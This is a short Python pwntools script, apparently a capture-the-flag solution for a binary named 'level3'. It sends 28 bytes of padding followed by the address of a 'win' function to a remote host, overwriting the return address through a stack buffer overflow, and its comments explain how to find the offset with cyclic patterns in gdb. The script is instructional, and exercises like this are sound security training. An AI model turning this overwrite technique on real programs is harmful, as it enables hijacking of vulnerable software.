from pwn import *

# Init the binary file
elf = ELF('./level3')

# Start the local file or connect to remote
# io = elf.process()
io = remote('3.85.17.84', '1272')

# Exact number of bytes before the return value
# Found using:
# 1. 'pwn cyclic 50' to generate a pattern
# 2. send pattern into program inside of gdb
# 3. copy the seg fault address
# 4. 'pwn cyclic -l 0x<seg_fault_address>
offset = 28

# Send 28 bytes to reach the token
# Sends the address of win to replace the return value
# pwntools ELF objects have an attribute sym to get the address of functions
# can also be done with elf.symbols['win'] or 'info add win' inside gdb
# p32 is used to pack the value to work with the binary
io.sendline(b'a'*offset + p32(elf.sym.win))

# Opens the process in the terminal to see the output and interact
io.interactive()
